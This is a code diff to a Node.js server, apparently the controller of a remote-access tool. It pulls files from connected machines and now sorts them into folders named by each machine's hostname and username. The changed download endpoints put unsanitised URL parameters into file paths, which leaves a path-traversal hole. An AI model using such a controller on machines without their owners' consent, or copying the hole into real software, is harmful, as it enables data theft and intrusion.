@@ -608,6 +608,52 @@ async function sendConnectionAlert(clientInfo) {
 })();
 
 // ============================================================
+// FILE ORGANIZATION FUNCTIONS
+// ============================================================
+
+/**
+ * Get client-specific download directory
+ * @param {string} clientId - Client ID
+ * @param {object} client - Client object with hostname and username
+ * @returns {string} - Path to client's download directory
+ */
+function getClientDownloadDir(clientId, client) {
+  // Create a safe directory name from client info
+  const hostname = client?.hostname || 'Unknown';
+  const username = client?.username || 'Unknown';
+  
+  // Clean the names for filesystem safety
+  const safeHostname = hostname.replace(/[<>:"/\\|?*]/g, '_');
+  const safeUsername = username.replace(/[<>:"/\\|?*]/g, '_');
+  
+  // Create directory name: PC-Username or just hostname if username is Unknown
+  const dirName = username !== 'Unknown' ? `${safeHostname}-${safeUsername}` : safeHostname;
+  
+  const clientDir = path.join('downloads', dirName);
+  
+  // Ensure directory exists
+  if (!fs.existsSync(clientDir)) {
+    fs.mkdirSync(clientDir, { recursive: true });
+    console.log(`[FILE] Created client directory: ${clientDir}`);
+  }
+  
+  return clientDir;
+}
+
+/**
+ * Get organized file path for client downloads
+ * @param {string} clientId - Client ID
+ * @param {object} client - Client object
+ * @param {string} filename - Original filename
+ * @returns {string} - Organized file path
+ */
+function getOrganizedFilePath(clientId, client, filename) {
+  const clientDir = getClientDownloadDir(clientId, client);
+  const safeFilename = path.basename(filename);
+  return path.join(clientDir, safeFilename);
+}
+
+// ============================================================
 // CLIENT HISTORY DATABASE FUNCTIONS
 // ============================================================
 
@@ -827,7 +873,8 @@ function createTcpServer() {
         pd.timeout = setTimeout(async () => {
           try {
             const filename = path.basename(pd.filename || `download_${Date.now()}`);
-            const downloadPath = path.join('downloads', filename);
+            const client = clients.get(clientId);
+            const downloadPath = getOrganizedFilePath(clientId, client, filename);
             fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
             console.log(`[TCP] File downloaded: ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
             io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
@@ -882,7 +929,8 @@ function createTcpServer() {
           pd.timeout = setTimeout(async () => {
             try {
               const filename = path.basename(pd.filename || `download_${Date.now()}`);
-              const downloadPath = path.join('downloads', filename);
+              const client = clients.get(clientId);
+              const downloadPath = getOrganizedFilePath(clientId, client, filename);
               fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
               console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
               io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
@@ -1107,7 +1155,7 @@ function createTcpServer() {
         if (client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
         const buf = client.pendingDownload.buffer || Buffer.alloc(0);
         const filename = path.basename(client.pendingDownload.filename || `download_${Date.now()}`);
-        const downloadPath = path.join('downloads', filename);
+        const downloadPath = getOrganizedFilePath(clientId, client, filename);
         const resolveShortcuts = client.pendingDownload.resolveShortcuts;
         
         if (buf.length > 0) {
@@ -1662,32 +1710,76 @@ app.get('/api/downloads', (req, res) => {
       return res.json([]);
     }
     
-    const files = fs.readdirSync(downloadsDir).map(filename => {
-      const filePath = path.join(downloadsDir, filename);
-      const stats = fs.statSync(filePath);
-      return {
-        filename,
-        size: stats.size,
-        modified: stats.mtime,
-        path: filePath
-      };
+    const result = [];
+    
+    // Get all client directories
+    const clientDirs = fs.readdirSync(downloadsDir).filter(item => {
+      const itemPath = path.join(downloadsDir, item);
+      return fs.statSync(itemPath).isDirectory();
     });
     
-    res.json(files);
+    // For each client directory, get files
+    clientDirs.forEach(clientDir => {
+      const clientPath = path.join(downloadsDir, clientDir);
+      const files = fs.readdirSync(clientPath).map(filename => {
+        const filePath = path.join(clientPath, filename);
+        const stats = fs.statSync(filePath);
+        return {
+          filename,
+          clientDir,
+          fullPath: filePath,
+          size: stats.size,
+          modified: stats.mtime,
+          isDirectory: stats.isDirectory()
+        };
+      });
+      
+      result.push({
+        clientDir,
+        files,
+        totalFiles: files.length,
+        totalSize: files.reduce((sum, file) => sum + file.size, 0)
+      });
+    });
+    
+    res.json(result);
   } catch (error) {
     res.status(500).json({ error: 'Failed to list downloads' });
   }
 });
 
-app.get('/api/downloads/:filename', (req, res) => {
-  const filename = req.params.filename;
-  const filePath = path.join('downloads', filename);
+app.get('/api/downloads/:clientDir/:filename', (req, res) => {
+  const { clientDir, filename } = req.params;
+  const filePath = path.join('downloads', clientDir, filename);
   
   if (fs.existsSync(filePath)) {
     res.download(filePath);
   } else {
     res.status(404).json({ error: 'File not found' });
   }
+});
+
+// Legacy endpoint for backward compatibility
+app.get('/api/downloads/:filename', (req, res) => {
+  const filename = req.params.filename;
+  
+  // Search in all client directories
+  const downloadsDir = 'downloads';
+  if (fs.existsSync(downloadsDir)) {
+    const clientDirs = fs.readdirSync(downloadsDir).filter(item => {
+      const itemPath = path.join(downloadsDir, item);
+      return fs.statSync(itemPath).isDirectory();
+    });
+    
+    for (const clientDir of clientDirs) {
+      const filePath = path.join(downloadsDir, clientDir, filename);
+      if (fs.existsSync(filePath)) {
+        return res.download(filePath);
+      }
+    }
+  }
+  
+  res.status(404).json({ error: 'File not found' });
 });
 
 // Email configuration endpoints
